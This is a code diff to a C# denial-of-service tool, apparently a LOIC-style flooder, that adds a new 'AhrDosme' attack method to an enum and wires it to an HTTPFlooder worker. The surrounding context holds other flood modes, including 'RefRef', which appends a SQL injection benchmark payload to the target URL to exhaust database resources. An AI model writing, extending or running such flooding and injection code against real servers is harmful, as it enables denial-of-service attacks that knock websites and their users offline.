@@ -13,7 +13,8 @@ namespace GAS.Core
         HTTP,
         ReCoil,
         SlowLOIC,
-        RefRef
+        RefRef,
+        AhrDosme
     }
     public class Manager
     {
@@ -81,6 +82,9 @@ namespace GAS.Core
                 case AttackMethod.RefRef:
                     this.Subsite += " and (select+benchmark(99999999999,0x70726f62616e646f70726f62616e646f70726f62616e646f))";
                     Worker = new HTTPFlooder(DNSString, Target.ToString(), Port, Subsite, WaitForResponse, Delay, Timeout, AppendRANDOMChars || AppendRANDOMCharsUrl, UseGZIP, Threads);
+                    break;
+                case AttackMethod.AhrDosme:
+                    Worker = new HTTPFlooder(DNSString, Target.ToString(), Port, Subsite, WaitForResponse, Delay, Timeout, AppendRANDOMChars || AppendRANDOMCharsUrl, UseGZIP, Threads,1);
                     break;
                 default :
                     throw new NotImplementedException("Code it yourself, lazy bastard");
